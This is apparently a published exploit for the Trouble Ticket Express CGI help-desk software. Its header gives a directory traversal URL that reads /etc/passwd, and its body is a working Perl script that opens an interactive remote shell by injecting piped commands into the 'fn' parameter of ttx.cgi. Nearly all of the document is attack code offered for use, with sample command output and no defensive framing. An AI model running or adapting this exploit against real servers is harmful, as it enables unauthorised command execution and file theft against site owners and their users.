# Exploit Title: Trouble Ticket Express Remote Code Execution/Directory Traversal
# Author: zombiefx <darkernet@gmail.com<mailto:darkernet@gmail.com>>
# Software Link: http://www.troubleticketexpress.com/download/ttx301.zip
# Version: v3.01,v3.0,v2.24,v2.21
# Tested on: Linux
# CVE :
# Code:
# Modified for WinAutoPWN

# This is only possible if an attachment input is available.
# Directory Traversal Vuln is
# http://localhost/cgi-bin/ttx.cgi?cmd=file&fn=../../../../../../etc/passwd
# Simple perl code to run commands on the box
# $ id
# uid=0(httpd) gid=0(httpd) groups=0(httpd)
# $ whoami
# httpd

#!/usr/bin/perl

use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

#use warnings;
#use strict;

#my $url = 'http://localhost/cgi-bin/ttx.cgi';
my $url0 = $ARGV[0]; 
my $url = $url0 . "/cgi-bin/ttx.cgi";
#print $url;
#print '$ ';
while (){

	print "[shell]:~\$ ";
	chomp($cmd=<STDIN>);

	if ($cmd eq "exit" || $cmd eq "quit") {
		exit 0;
	}

my $ua = LWP::UserAgent->new;
$own = $url . "?cmd=file&fn=%7C" . $cmd . "%0A%7C";
my $req = HTTP::Request->new(GET => $own);
	my $res = $ua->request($req);
	my $con = $res->content;
	print $con;
	if ($res->is_success){
		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
		
	}
           else
             {
                print "[p0c] Exploit failed\n";
                exit(1);
             }

}

#while (<>) {
#    print get( $url . '?cmd=file&fn=|' . $_ . '|' );
#    print '$ ';
#}
#<mailto:darkernet@gmail.com>



